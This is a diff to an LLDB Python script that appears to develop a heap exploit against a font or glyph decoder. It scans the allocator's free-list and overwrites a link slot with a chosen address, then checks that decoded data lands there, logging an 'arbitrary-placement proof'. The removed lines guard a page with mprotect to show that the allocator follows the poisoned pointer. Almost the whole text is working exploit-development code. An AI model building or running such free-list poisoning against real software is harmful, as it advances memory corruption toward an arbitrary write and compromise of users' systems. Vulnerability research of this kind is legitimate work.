@@ -1,8 +1,4 @@
-# RIP-20: poison-to-arbitrary-write mechanism proof.
-# P1: recon x19 chain (head + first blocks). P2: overwrite free-list head with
-# TARGET (guarded page) -> SIGSEGV on pop = allocator follows poison (regs dumped
-# at strike for value-control recon). P3: poison again, UNGUARDED TARGET ->
-# decode runs to exit -> dump what landed in the chosen block = data-in-block proof.
+# RIP-20b: poison-to-arbitrary-write — link-scan + data-in-chosen-block proof.
 import os, sys, struct, time
 import lldb
 t = lldb.debugger.GetSelectedTarget()
@@ -42,73 +38,32 @@ def stop5():
         if x19: break
     return p, x19, x27, (bpe, bpw)
 
-def cleanup(bps):
-    for b in bps:
-        if b: t.BreakpointDelete(b.GetID())
-
-# PHASE-1: recon
+# P1: link-scan recon
 p, x19, x27, bps = stop5()
 if not p:
     T("P1 launchfail"); TRACE.close(); sys.exit(0)
 T("P1 x19=%x x27=%x" % (x19, x27))
-head = qwords(p, x19, 8)
-T("P1 x19[0..8]=%s" % [hex(q) for q in (head or [])])
-if head and 0x100000000 <= head[0] < 0x800000000000:
-    b1 = qwords(p, head[0], 8)
-    T("P1 block1(head[0])=%s" % [hex(q) for q in (b1 or [])])
+qs = qwords(p, x19, 64)
+links = [(j*8, hex(q)) for j, q in enumerate(qs or []) if 0x100000000 <= q < 0x800000000000]
+T("P1 x19 links: %s" % links)
 cleanup(bps); p.Kill()
 
-# PHASE-2: guarded poison
-p, x19, x27, bps = stop5()
-if not p or not x19:
-    T("P2 nox19"); cleanup(bps); TRACE.close(); sys.exit(0)
-target = 0
-for cand in (x27 + 0x20000, x27 + 0x30000, x27 + 0x40000, x27 - 0x30000):
-    page = cand & ~0xFFF
-    v = t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 3)' % page)
-    if v.GetValueAsSigned() == 0:
-        target = page
-        break
-if not target:
-    T("P2 no-target"); cleanup(bps); p.Kill(); TRACE.close(); sys.exit(0)
-t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 1)' % target)
-T("P2 poison x19[0] -> %x (guarded)" % target)
-wr(p, x19, struct.pack('<Q', target))
-for b in bps:
-    if b: t.BreakpointDelete(b.GetID())
-p.Continue()
-st = p.GetState()
-while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
-if st == lldb.eStateStopped:
-    th2 = p.GetSelectedThread()
-    fr2 = th2.GetSelectedFrame()
-    off = -1
-    if fr2.GetSymbol():
-        off = fr2.GetPCAddress().GetLoadAddress(t) - fr2.GetSymbol().GetStartAddress().GetLoadAddress(t)
-    desc = th2.GetStopDescription(300) or ""
-    fa = 0
-    if "address=" in desc:
-        try: fa = int(desc.split("address=")[1].split(")")[0], 16)
-        except Exception: pass
-    T("P2 POP-PROOF: strike +%d fa=%x (target=%x %s)" % (off, fa, target, "ON-TARGET" if (fa >> 12) == (target >> 12) else "off"))
-    regs = {}
-    for r in ("x0","x1","x2","x3","x4","x5","x6","x7","x8","x9","x10","x11","x12","x13","x14","x15","x16","x17","x19","x20","x21","x22","x23","x24","x25","x26","x27","x28"):
-        v = fr2.FindRegister(r).GetValueAsUnsigned()
-        if v: regs[r] = v
-    T("P2 regs: %s" % {k: hex(v) for k, v in regs.items()})
-    p.Kill()
-else:
-    T("P2 no-pop rc=%s (poison not followed)" % p.GetExitStatus())
-
-# PHASE-3: unguarded poison -> allocator pops chosen block -> glyph data lands
+# P3 (primary): poison first link slot -> chosen block -> glyph data lands
 p, x19, x27, bps = stop5()
 if not p or not x19:
     T("P3 nox19"); cleanup(bps); TRACE.close(); sys.exit(0)
+qs = qwords(p, x19, 64)
+slot = None
+for j, q in enumerate(qs or []):
+    if 0x100000000 <= q < 0x800000000000:
+        slot = x19 + j*8; break
+if slot is None:
+    slot = x19  # fallback: head slot even if empty
 blk = (x27 - 0x4000) + 0x100
-wr(p, blk, bytes(0x400))  # zero the landing zone
-wr(p, x19, struct.pack('<Q', blk))
-T("P3 poison x19[0] -> %x (unguarded), zeroed 1KB" % blk)
-# keep ONLY the walk bp; continue to next stop and read the block alive
+wr(p, blk, bytes(0x200))  # zero landing zone
+oldslot = qwords(p, slot, 1)
+wr(p, slot, struct.pack('<Q', blk))
+T("P3 poison slot=%x (was %s) -> blk=%x" % (slot, hex(oldslot[0]) if oldslot else "?", blk))
 for b in bps:
     if b and b.GetID() != bps[1].GetID(): t.BreakpointDelete(b.GetID())
 bps[1].SetOneShot(False)
@@ -121,12 +76,14 @@ if st == lldb.eStateStopped:
         nz = sum(1 for b in data if b)
         T("P3 BLOCK-CONTENT: nonzero=%d/128 first16=%s" % (nz, data[:16].hex()))
         if nz:
-            T("P3 DATA-IN-CHOSEN-BLOCK = ARBITRARY-PLACEMENT PROOF")
+            T("P3 DATA-IN-CHOSEN-BLOCK = ARBITRARY-PLACEMENT PROOF ✅")
     else:
-        T("P3 read fail: %s" % err.GetCString())
+        T("P3 read fail")
+    now = qwords(p, slot, 1)
+    T("P3 slot now: %s (consumed=%s)" % (hex(now[0]) if now else "?", now and now[0] != blk))
     p.Kill()
 else:
-    T("P3 exited rc=%s before next stop" % p.GetExitStatus())
+    T("P3 exited rc=%s" % p.GetExitStatus())
 cleanup(bps)
 T("RIP-20 DONE")
 TRACE.close()
